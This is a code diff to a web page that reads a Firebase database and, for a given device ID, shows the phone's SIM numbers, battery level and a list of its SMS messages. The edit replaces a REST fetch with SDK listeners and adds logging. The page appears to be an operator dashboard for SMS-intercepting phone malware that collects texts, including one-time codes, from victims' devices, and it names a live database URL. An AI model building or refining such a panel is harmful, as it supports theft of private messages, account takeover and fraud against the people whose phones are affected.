@@ -193,46 +193,51 @@
         });
         const db = getDatabase(app);
         const smsRef = ref(db, 'common/smsData');
-        const usersRef = ref(db, 'users');
 
-        // First, fetch device info
-        async function loadDeviceInfo() {
-            try {
-                const response = await fetch(
-                    `https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app/users/${deviceId}.json`
-                );
-                const data = await response.json();
+        // ============================================
+        // FIXED: Use Firebase SDK for device info (no CORS)
+        // ============================================
+        onValue(ref(db, `users/${deviceId}`), (snapshot) => {
+            const data = snapshot.val();
+            
+            if (data) {
+                deviceNameEl.textContent = data.device_name || 'Unknown Device';
+                deviceIdEl.textContent = `ID: ${deviceId}`;
                 
-                if (data) {
-                    deviceNameEl.textContent = data.device_name || 'Unknown Device';
-                    deviceIdEl.textContent = `ID: ${deviceId}`;
-                    
-                    const sim1 = data.Sim1 || 'No SIM';
-                    const sim2 = data.Sim2 || 'No SIM';
-                    const displayNumber = sim1 !== 'Insert SIM card!' && sim1 !== 'Number not available' 
-                        ? sim1 
-                        : (sim2 !== 'Insert SIM card!' && sim2 !== 'Number not available' ? sim2 : 'No Number');
-                    
-                    // Add number to display
-                    const statsDiv = document.getElementById('deviceStats');
-                    statsDiv.innerHTML = `📞 ${displayNumber} · 🔋 ${data.charge || 0}%`;
+                const sim1 = data.Sim1 || 'No SIM';
+                const sim2 = data.Sim2 || 'No SIM';
+                let displayNumber = 'No Number';
+                
+                if (sim1 !== 'Insert SIM card!' && sim1 !== 'Number not available' && sim1 !== 'No SIM') {
+                    displayNumber = sim1;
+                } else if (sim2 !== 'Insert SIM card!' && sim2 !== 'Number not available' && sim2 !== 'No SIM') {
+                    displayNumber = sim2;
                 }
-            } catch (error) {
-                console.warn('Could not load device info:', error);
-                deviceNameEl.textContent = 'Device';
+                
+                const statsDiv = document.getElementById('deviceStats');
+                statsDiv.innerHTML = `📞 ${displayNumber} · 🔋 ${data.charge || 0}%`;
+            } else {
+                deviceNameEl.textContent = 'Device Not Found';
                 deviceIdEl.textContent = `ID: ${deviceId}`;
             }
-        }
+        }, (error) => {
+            console.warn('Could not load device info:', error);
+            deviceNameEl.textContent = 'Device';
+            deviceIdEl.textContent = `ID: ${deviceId}`;
+        });
 
-        loadDeviceInfo();
-
+        // ============================================
         // Listen for SMS messages - filter by deviceId
+        // ============================================
+        console.log(`📡 Listening for messages from device: ${deviceId}`);
+
         onValue(smsRef, (snapshot) => {
             const data = snapshot.val();
             
             if (!data) {
-                container.innerHTML = '<div class="no-msg">📭 No messages for this device</div>';
+                container.innerHTML = '<div class="no-msg">📭 No messages found</div>';
                 counter.textContent = '0 messages';
+                msgCountEl.textContent = '0 messages';
                 return;
             }
 
@@ -245,6 +250,8 @@
                     if (a.time < b.time) return 1;
                     return 0;
                 });
+
+            console.log(`📨 Found ${deviceMessages.length} messages for device ${deviceId}`);
 
             msgCountEl.textContent = `${deviceMessages.length} messages`;
             counter.textContent = `${deviceMessages.length} messages`;
@@ -272,10 +279,12 @@
             container.appendChild(fragment);
 
         }, (error) => {
-            console.error('Error:', error);
+            console.error('❌ Firebase error:', error);
             container.innerHTML = `<div class="error">❌ ${error.message}</div>`;
             counter.textContent = 'Error';
         });
+
+        console.log('✅ Device SMS page loaded for:', deviceId);
     </script>
 </body>
 </html>
